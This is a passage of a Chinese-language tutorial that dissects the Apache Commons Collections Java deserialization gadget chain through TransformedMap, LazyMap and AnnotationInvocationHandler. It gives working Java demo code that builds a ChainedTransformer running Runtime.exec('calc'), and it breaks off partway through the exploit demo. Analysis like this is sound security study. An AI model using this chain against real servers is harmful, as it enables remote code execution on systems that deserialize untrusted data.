需要注意的一点是，ChainedTransformer.transform会对最开始传入的参数object进行迭代，这样对我们的链的构造比较有利，因为Runtime.getRuntime().exec(“calc”)本身也是一个类似的过程。
但其实有个别的问题，这里先举个例子，
    A a = new A(); 
    if(a.getClass()==A.class) 
        System.out.println("equal"); 
    else
        System.out.println("unequal");
这段代码会打印出equal。对于getClass()而言，当input是一个类的实例对象时，获取到的是这个类，当input是一个类时，获取到的是java.lang.Class。我们想在段1实现的是如下目的：Runtime.getRuntime().exec(“calc”)。  
但InvokerTransformer中的情况是这样的，
也就是说，我们第一环的Runtime类无法直接通过InvokerTransformer获取。因为Runtime对象不能像普通对象一样直接声明，我们不能像示例里那样runtime.getClass，否则我们就直接runtime.exec(“calc”)就好了。
为了解决这个问题，就用到了性质很好的ConstantTransformer，
无论参数是什么，这个Transformer的transform函数的返回值都是this.iConstant，我们可以用一个以Runtime类为iConstant的ConstantTransformer为段1第一环，接下来再去调用InvokerTransformer的transform函数调用getRuntime()得到当前Runtime的引用，再调用exec()。  
走到现在，或者说找到ChainedTransformer的同时，我们应该有意识的去找ChainedTransformer.transform的调用点了。到现在为止，我们构造好了带有payload的第一段，对于这一段而言，由于ConstantTransformer的存在，我们需要的仅是对我们构造好的ChainedTransformer的transform函数的一处调用（无论参数是什么，只需要一处调用，将这分成了第一段）。
####  2.2 段2
这一段的终点即是对上一段中构造好的ChainedTransformer.transform的调用点，起点要尽量向某个类的重写的readObject函数逼近。  
这一段有两种走法，一是走TransformedMap，二是走LazyMap，两种走法思路相同，走的路线不同。
#####  （一）TransformedMap
先说TransformedMap，
TransformedMap类用来对Map进行某种变换，只要以Map类型调用decorate()函数，传入key和value的变换函数KeyTransformer或ValueTransformer，即可生成相应的TransformedMap。其成员变量和decorate()函数如下，
我们可以控制其中的valueTransformer参数为构造好的ChainedTransformer。
TransformedMap父类AbstractInputCheckedMapDecorator类中有对setValue的重写，每当调用setValue方法时，该方法将会被调用。
跟进parent.checkSetValue，此处会调用TranformerMap.valueTransformer.transform方法，
2.1的末尾我们讲了，此处无论此处参数value的值是什么，只要valueTransformer被控制为构造好的ChainedTransformer，这里调用transform即可触发上面的payload。
理一下，Map中的任意项的Key或者Value被修改（此处使用setValue函数修改map.value），相应的Transformer(这里为valueTransformer)的transform方法就在checkSetValue中会被调用。
这一段流程即为：先通过TransformedMap.decorate()方法，获得一个TransformedMap的实例，再通过TransformedMap.setValue(无论参数)
-> checkSetValue -> valueTransformer.transform(value)即可触发。
写个demo验证一下，
    import org.apache.commons.collections.Transformer; 
    import org.apache.commons.collections.functors.ChainedTransformer; 
    import org.apache.commons.collections.functors.ConstantTransformer; 
    import org.apache.commons.collections.functors.InvokerTransformer; 
    import org.apache.commons.collections.map.TransformedMap; 
    import java.io.IOException; 
    import java.util.HashMap; 
    import java.util.Iterator; 
    import java.util.Map;  
    public class payloadTest { 
      public static void main(String[] args) throws IOException { 
        Transformer[] transformers = new Transformer[]{ 
    new ConstantTransformer(Runtime.class), 
    new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }), 
           new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), 
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}) 
         }; 
        //Runtime.getRuntime().exec("calc"); 
        Transformer chainedTransformer = new ChainedTransformer(transformers); 
         Map inMap = new HashMap(); 
        inMap.put("key", "value");//随便一个Map即可 
         Map outMap = TransformedMap.decorate(inMap, null, chainedTransformer);//生成TransformedMap 
         for (Iterator iterator = outMap.entrySet().iterator(); iterator.hasNext();){ 
           Map.Entry entry = (Map.Entry) iterator.next(); 
           entry.setValue("1");//无论参数为何值 
         } 
       } 
    }
直接run会可能报错，报错内容:  
Error running ‘ServiceStarter’: Command line is too long. Shorten command line
for ServiceStarter or also for Application default configuration.
大多数操作系统都有最大的命令行限制，当它超过时，IDEA将无法运行您的应用程序。
当命令行长于32768个字符时，IDEA建议您切换到动态类路径。长类路径被写入文件，然后由应用程序启动器读取并通过系统类加载器加载。  
在下面的console里看下，
由于有路径的原因，命令确实比较长，但也没长到几万，不知为何发生。
解法:  
修改项目下 .idea\workspace.xml，找到标签  ，
在标签里加一行   
修改完成后，run，
成功执行。  
如果这样走，我们需要找的即是对TransformedMap.setvalue的一处调用（也是无论参数为何值，将这分成第二段），寻找调用点的部分将在2.3中实现。
#####  （二）LazyMap
另一条路线走LazyMap，基本内容如下，
本着找transform调用点的目的（可用grep -R InvokerTransformer
之类的命令模糊地查找下），我们发现在get()方法中有transform()方法的调用点。
我们看到，这里的Transformer factory是可以被decorate()修改的。
我们只要在decorate时，将构造好的ChainedTransformer作为factory，再调用get函数（稍微留意参数）即可触发。那么现在漏洞利用的核心条件就是去寻找一个类，在对象进行反序列化时会调用我们精心构造对象的get(Object)方法。
提一下，Ysoserial的CommonsCollections1采用的就是这种思路。
####  2.3 段3
无论是上面的TransformedMap.setValue()还是LazyMap.get()方法，我们在demo里都是手动调用的。我们在实际的利用过程中，我们能找到的一般只有服务端的反序列化点，显然我们还是需要向readObject靠拢，找到服务端对某个类重写的readObject函数，能够通过几次或几层的调用触发我们编好的两段链。
这里我们找到的类就是AnnotationInvocationHandler，该类是Java运行库中的一个类，包含一个Map对象属性，其readObject方法可以修改自身Map属性的操作。
承接着2.2，第三段也有两种走法，思路上差不多，只是走的路线有些差异。
#####  （一）TransformedMap
先看一下基本信息，
其中的memberValues是一个Map类型，可以填上我们的TransformedMap，
接下来就是最关键的readObject函数，
我们可以看到，这里有对var5.setValue，上面我们提到，无论setValue的参数为何值，只要调用setValue均可触发段2，进而触发段1
实现利用。
对于这个readObject，想要调用setValue有几个条件：1.memberValues构造为transformedMap；2.var7 !=
null；3.var7不是var8的实例，var8不是异常类型。
写个demo利用一下，
     import java.io.; 
     import java.lang.annotation.Retention; 
     import java.lang.annotation.Target; 
     import java.lang.reflect.Constructor; 
     import java.util.HashMap; 
     import java.util.Map; 
     import org.apache.commons.collections.Transformer; 
     import org.apache.commons.collections.functors.ChainedTransformer; 
     import org.apache.commons.collections.functors.ConstantTransformer; 
     import org.apache.commons.collections.functors.InvokerTransformer; 
     import org.apache.commons.collections.map.TransformedMap; 
     public class CommonsCollectionPayload { 
       public static void main(String[] args) throws Exception { 
         //Runtime.getRuntime().exec("calc"); 
         Transformer[] transformers = new Transformer[]{ 
             new ConstantTransformer(Runtime.class), 
             new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }), 
             new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), 
             new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}) 
         }; 
         Transformer chainedTransformer = new ChainedTransformer(transformers); 